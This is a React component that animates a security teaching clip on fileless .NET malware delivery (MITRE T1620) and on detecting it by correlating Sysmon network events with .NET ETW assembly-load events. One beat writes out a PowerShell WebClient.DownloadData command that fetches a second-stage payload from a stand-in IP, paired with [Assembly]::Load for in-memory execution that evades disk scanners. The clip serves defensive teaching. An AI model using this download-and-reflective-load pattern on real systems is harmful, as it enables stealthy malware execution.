'use client';

import { useCallback } from 'react';
import gsap from 'gsap';
import { AnimeClipStage, type ClipTimelineApi } from '../../AnimeClipStage';
import { FilmBackdrop } from '../../FilmBackdrop';
import { clipPace } from '../../clipPace';

const FONT = 'ui-monospace, monospace';

const BEATS = [
  {
    id: 0,
    tag: '01',
    title: 'WebClient.DownloadData streams 184 KB straight into RAM over HTTPS',
    story:
      'An overhead pneumatic glass air-tube drops glowing metallic components straight into the workshop from outside without opening the warehouse door.',
    technical:
      '(New-Object Net.WebClient).DownloadData("https://198.51.100.74/assets/stage2.bin") -> Sysmon EID 3 logged; 0 bytes on NTFS.',
  },
  {
    id: 1,
    tag: '02',
    title: 'NTFS disk scale stays flat at 0.0 kg (Sysmon Event ID 11 silent)',
    story:
      'The warehouse receiving door stays padlocked and the digital floor scale never moves above zero kilograms.',
    technical:
      'Zero FileCreate operations occur on disk, bypassing file-hash AV and Sysmon Event ID 11 completely.',
  },
  {
    id: 2,
    tag: '03',
    title: '[Assembly]::Load($bytes) maps unbacked MEM_PRIVATE RWX PE in RAM',
    story:
      'The floating metallic parts converge mid-air on the levitation ring, snapping into a spinning reconnaissance drone cleanly above the floor.',
    technical:
      'ReflectiveLoader / CLR maps MZ/PE (4D 5A 90 00) at 0x000001E4A2100000 (MEM_PRIVATE RWX), resolves IAT + relocations, calls entry point.',
  },
  {
    id: 3,
    tag: '04',
    title: 'Correlating Sysmon EID 3 + .NET ETW EID 152 catches fileless execution',
    story:
      'Even with zero floor weight, the control room catches the inbound air-tube delivery paired with a brand-new mid-air assembly carrying no warehouse receipt.',
    technical:
      'Microsoft-Windows-DotNETRuntime ETW EID 152 records AssemblyLoad with FullyQualifiedPath = "" (memory-only).',
  },
];

const CAMERAS = [
  { id: 'WIDE', transform: 'scale(1)' },
  { id: 'HTTPS STREAM', transform: 'scale(1.22) translate(50px, -25px)' },
  { id: 'ZERO DISK', transform: 'scale(1.24) translate(-40px, -95px)' },
  { id: 'REFLECTIVE RAM', transform: 'scale(1.26) translate(-220px, -35px)' },
];

export function AmsiStep4ReflectiveLoadClip() {
  const build = useCallback(({ root, setBeat }: ClipTimelineApi) => {
    const q = (sel: string) => root.querySelectorAll(sel);
    const tl = gsap.timeline();

    tl.set(q('.https-stream, .ram-pipe'), { strokeDasharray: 280, strokeDashoffset: 280 });
    tl.set(q('.pe-section'), { autoAlpha: 0, y: 18 });
    tl.set(q('.ntfs-zero, .etw-152'), { autoAlpha: 0, y: 12 });

    // Beat 0: HTTPS stream into RAM byte array
    tl.addLabel('beat0');
    tl.call(() => setBeat(0), [], 'beat0');
    tl.to(q('.https-stream'), { strokeDashoffset: 0, duration: clipPace.travel, ease: 'none' }, 'beat0');
    tl.to({}, { duration: clipPace.hold });

    // Beat 1: NTFS disk remains 0 bytes
    tl.addLabel('beat1');
    tl.call(() => setBeat(1), [], 'beat1');
    tl.to(q('.ntfs-zero'), { autoAlpha: 1, y: 0, duration: 0.6, ease: 'power2.out' }, 'beat1');
    tl.to({}, { duration: clipPace.hold });

    // Beat 2: Assembly.Load maps unbacked MEM_PRIVATE RWX sections mid-air
    tl.addLabel('beat2');
    tl.call(() => setBeat(2), [], 'beat2');
    tl.to(q('.ram-pipe'), { strokeDashoffset: 0, duration: clipPace.teach, ease: 'none' }, 'beat2');
    tl.to(
      q('.pe-section'),
      { autoAlpha: 1, y: 0, duration: 0.55, stagger: 0.22, ease: 'back.out(1.4)' },
      'beat2+=0.3'
    );
    tl.to({}, { duration: clipPace.hold });

    // Beat 3: CLR ETW 152 detection strip
    tl.addLabel('beat3');
    tl.call(() => setBeat(3), [], 'beat3');
    tl.to(q('.etw-152'), { autoAlpha: 1, y: 0, duration: clipPace.teach, ease: 'power2.out' }, 'beat3');
    tl.to({}, { duration: clipPace.end });

    return tl;
  }, []);

  return (
    <AnimeClipStage
      testId="technical-clip-amsi-step4"
      stageLabel="STEP #4"
      mitreId="T1620"
      beats={BEATS}
      cameras={CAMERAS}
      build={build}
    >
      <svg
        viewBox="0 0 1200 640"
        className="block h-full w-full"
        role="img"
        aria-label="HTTPS stager streams 184 KB directly into RAM byte array bypassing NTFS disk with zero Sysmon EID 11 while Assembly.Load maps unbacked MEM_PRIVATE RWX at 0x000001E4A2100000 logged by CLR ETW EID 152"
      >
        <FilmBackdrop prefix="amsi4" />

        <text x="28" y="30" fill="#94a3b8" fontSize="12" fontFamily={FONT} letterSpacing="0.12em">
          FILELESS DELIVERY · WebClient.DownloadData → [Assembly]::Load($bytes)
        </text>
        <text x="1172" y="30" textAnchor="end" fill="#64748b" fontSize="12" fontFamily={FONT}>
          0 Disk Bytes · MEM_PRIVATE RWX
        </text>

        {/* Left: HTTPS Stager */}
        <g transform="translate(46, 108)">
          <rect width="240" height="175" rx="14" fill="#280b18" stroke="#f43f5e" strokeWidth="2.5" />
          <text x="18" y="32" fill="#fda4af" fontSize="12" fontFamily={FONT} fontWeight="700">
            EXTERNAL STAGER
          </text>
          <text x="18" y="68" fill="#f8fafc" fontSize="19" fontFamily={FONT} fontWeight="800">
            198.51.100.74
          </text>
          <text x="18" y="96" fill="#cbd5e1" fontSize="13" fontFamily={FONT}>
            TCP/443 · TLS 1.3
          </text>
          <text x="18" y="128" fill="#fb7185" fontSize="12.5" fontFamily={FONT}>
            /assets/stage2.bin (184 KB)
          </text>
          <text x="18" y="156" fill="#fbbf24" fontSize="11.5" fontFamily={FONT}>
            Logged by Sysmon EID 3
          </text>
        </g>

        {/* Stream Arrow 1 */}
        <path
          className="https-stream"
          d="M 292 195 L 408 195"
          fill="none"
          stroke="#a855f7"
          strokeWidth="4.5"
          strokeLinecap="round"
        />
        <text x="350" y="177" textAnchor="middle" fill="#d8b4fe" fontSize="11.5" fontFamily={FONT}>
          byte[] RAM
        </text>

        {/* Middle: Managed RAM Buffer */}
        <g transform="translate(416, 108)">
          <rect width="268" height="175" rx="14" fill="#172033" stroke="#8b5cf6" strokeWidth="2.5" />
          <text x="18" y="32" fill="#c4b5fd" fontSize="12" fontFamily={FONT} fontWeight="700">
            VOLATILE RAM BUFFER
          </text>
          <text x="18" y="68" fill="#f8fafc" fontSize="19" fontFamily={FONT} fontWeight="800">
            DownloadData()
          </text>
          <text x="18" y="100" fill="#cbd5e1" fontSize="13" fontFamily={FONT}>
            AMSI Blind (E_INVALIDARG)
          </text>
          <text x="18" y="130" fill="#a78bfa" fontSize="13" fontFamily={FONT}>
            byte[] $bytes = 184 KB
          </text>
          <text x="18" y="158" fill="#6ee7b7" fontSize="12" fontFamily={FONT}>
            Never written to NTFS
          </text>
        </g>

        {/* Stream Arrow 2 */}
        <path
          className="ram-pipe"
          d="M 690 195 L 792 195"
          fill="none"
          stroke="#f59e0b"
          strokeWidth="4.5"
          strokeLinecap="round"
        />
        <text x="741" y="177" textAnchor="middle" fill="#fbbf24" fontSize="11.5" fontFamily={FONT}>
          Reflective
        </text>

        {/* Right: Unbacked MEM_PRIVATE RWX Allocation */}
        <g transform="translate(800, 80)">
          <rect width="352" height="312" rx="16" fill="#1b1128" stroke="#c084fc" strokeWidth="2.5" />
          <text x="20" y="32" fill="#e9d5ff" fontSize="12" fontFamily={FONT} fontWeight="800">
            UNBACKED MEM_PRIVATE RWX (0x40)
          </text>
          <text x="20" y="58" fill="#facc15" fontSize="14.5" fontFamily={FONT} fontWeight="800">
            Base: 0x000001E4A2100000
          </text>

          <g transform="translate(20, 80)">
            <g className="pe-section">
              <rect width="312" height="58" rx="10" fill="#450a0a" stroke="#f43f5e" strokeWidth="2" />
              <text x="16" y="24" fill="#fda4af" fontSize="12" fontFamily={FONT} fontWeight="700">
                1. MZ / PE HEADER IN RAM
              </text>
              <text x="16" y="46" fill="#fef2f2" fontSize="13" fontFamily={FONT}>
                4D 5A 90 00 · FileObject = NULL
              </text>
            </g>
          </g>

          <g transform="translate(20, 152)">
            <g className="pe-section">
              <rect width="312" height="58" rx="10" fill="#422006" stroke="#f59e0b" strokeWidth="2" />
              <text x="16" y="24" fill="#fde047" fontSize="12" fontFamily={FONT} fontWeight="700">
                2. RELOCATIONS &amp; IAT RESOLVED
              </text>
              <text x="16" y="46" fill="#fef3c7" fontSize="13" fontFamily={FONT}>
                Manual Load without LoadLibraryW
              </text>
            </g>
          </g>

          <g transform="translate(20, 224)">
            <g className="pe-section">
              <rect width="312" height="64" rx="10" fill="#052e16" stroke="#10b981" strokeWidth="2" />
              <text x="16" y="26" fill="#6ee7b7" fontSize="12" fontFamily={FONT} fontWeight="700">
                3. ENTRY POINT EXECUTES LIVE
              </text>
              <text x="16" y="49" fill="#ecfdf5" fontSize="13" fontFamily={FONT}>
                Stage2Recon runs inside PID 5412
              </text>
            </g>
          </g>
        </g>

        {/* Bottom-Left: Untouched NTFS Disk Scale */}
        <g transform="translate(46, 324)">
          <g className="ntfs-zero">
            <rect width="638" height="108" rx="14" fill="#0f172a" stroke="#64748b" strokeWidth="2" strokeDasharray="8 5" />
            <text x="22" y="34" fill="#94a3b8" fontSize="12.5" fontFamily={FONT} fontWeight="800">
              NTFS DISK FLOOR SCALE: 0.0 KG (ZERO DISK WRITES)
            </text>
            <text x="22" y="68" fill="#cbd5e1" fontSize="14" fontFamily={FONT}>
              Sysmon Event ID 11 (FileCreate) = NONE · On-disk file scanners see 0 bytes.
            </text>
          </g>
        </g>

        {/* Bottom Witness: .NET ETW EID 152 */}
        <g transform="translate(46, 466)">
          <g className="etw-152">
            <rect width="1106" height="118" rx="14" fill="#052e16" stroke="#10b981" strokeWidth="2.5" />
            <text x="24" y="34" fill="#34d399" fontSize="13" fontFamily={FONT} fontWeight="800">
              DETECT CORRELATION · Sysmon EID 3 (198.51.100.74:443) + DotNETRuntime ETW EID 152
            </text>
            <text x="24" y="68" fill="#ecfdf5" fontSize="14.5" fontFamily={FONT}>
              AssemblyLoad: Name=&quot;Stage2Recon&quot;  |  FullyQualifiedPath=&quot;&quot; (EMPTY = MEMORY-ONLY!)
            </text>
            <text x="24" y="96" fill="#6ee7b7" fontSize="12.5" fontFamily={FONT}>
              Hunting empty-path CLR loads alongside unbacked MEM_PRIVATE RWX MZ headers catches fileless implants.
            </text>
          </g>
        </g>
      </svg>
    </AnimeClipStage>
  );
}
